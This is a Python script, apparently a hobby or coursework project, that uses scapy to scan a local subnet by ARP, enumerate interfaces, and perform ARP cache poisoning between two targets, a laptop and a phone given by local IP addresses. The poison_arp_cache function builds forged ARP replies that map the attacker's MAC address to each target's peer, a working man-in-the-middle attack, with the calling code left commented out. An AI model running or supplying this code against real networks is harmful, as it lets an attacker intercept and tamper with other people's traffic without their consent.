
from ipaddress import IPv4Address
from scapy.all import *
from scapy.all import ARP, Ether, srp
import netifaces

from util import *

# get interfaces, choose one to perfom the attack on
# interfaces = get_if_list()

def scan_hosts(subnet):
    """Scans the subnet and returns a list of hosts
    """
    arp = ARP(pdst=subnet)
    ether = Ether(dst='ff:ff:ff:ff:ff:ff')
    packet = ether/arp
    result = srp(packet, timeout=10, verbose=0)[0]

    hosts = []

    for request, response in result:
        hosts.append({
            'ip_address': response.psrc,
            'mac_address': response.hwsrc
        })

    return hosts

def get_interfaces():
    """Returns a list of interfaces
    """
    interfaces = []

    for interface_guid in netifaces.interfaces():
        try:
            addresses = netifaces.ifaddresses(interface_guid)
            print(addresses)
            if netifaces.AF_INET not in addresses:
                continue

            address = addresses[netifaces.AF_INET]
        except ValueError:
            continue

        if len(address) != 1:
            raise RuntimeWarning(f'Address does not contain strictly 1 address! address={address}')

        if len(address) == 0:
            continue
        
        address = address[0]

        interface = {
            'subnet_mask': address['netmask'],
            'ip_address': address['addr'],
            'interface_guid': interface_guid,
            # 'interface_description': interface['description'],
            # 'interface_name': interface['name'],
            'subnet': f"{address['addr']}/{get_prefix_length(address['netmask'])}"
        }

        interfaces.append(interface)

    return interfaces


def poison_arp_cache(interface_name, attacker, target1, target2):
    # send ARP reply to target 1
    # send ARP reply to target 2
    
    # Send mac of attacker to target 1
    packet = Ether() / ARP()
    packet[Ether].src = attacker['mac_address']
    packet[Ether].dst = target1['mac_address']
    packet[ARP].op = 2
    packet[ARP].hwsrc = attacker['mac_address']
    packet[ARP].psrc = target2['ip_address']
    packet[ARP].hwdst = target1['mac_address']
    packet[ARP].pdst = target1['ip_address']

    packet.show()

    sendp(packet, iface=interface_name)

    # Send mac of attacker to target 2
    packet = Ether() / ARP()
    packet[Ether].src = attacker['mac_address']
    packet[Ether].dst = target2['mac_address']
    packet[ARP].op = 2
    packet[ARP].hwsrc = attacker['mac_address']
    packet[ARP].psrc = target1['ip_address']
    packet[ARP].hwdst = target2['mac_address']
    packet[ARP].pdst = target2['ip_address']

    packet.show()
    sendp(packet, iface=interface_name)

    # repeat ARP replies every X seconds

print('listing interfaces...')
interfaces = get_interfaces()

# user has to do this step: choosing a network interface
interface = list(filter(lambda interface: interface['interface_guid'] == '{09B94E68-838F-4BC6-8893-129A4E969A5D}', interfaces))[0]

# print('listing hosts...')
# hosts = scan_hosts(interface['subnet'])
# print('finished')

# for host in hosts:
#     print(host['ip_address'])

# # store ip and mac of the attacker
# attacker = next(filter(lambda x: x['ip_address'] == interface['ip_address'], hosts), None)

# # choose target 1
# laptop = next(filter(lambda x: x['ip_address'] == '192.168.2.113', hosts), None)
# print(laptop)
# # # choose target 2
# phone = next(filter(lambda x: x['ip_address'] == '192.168.2.16', hosts), None)
# print(phone)

# poison_arp_cache(interface['interface_name'], attacker, laptop, phone)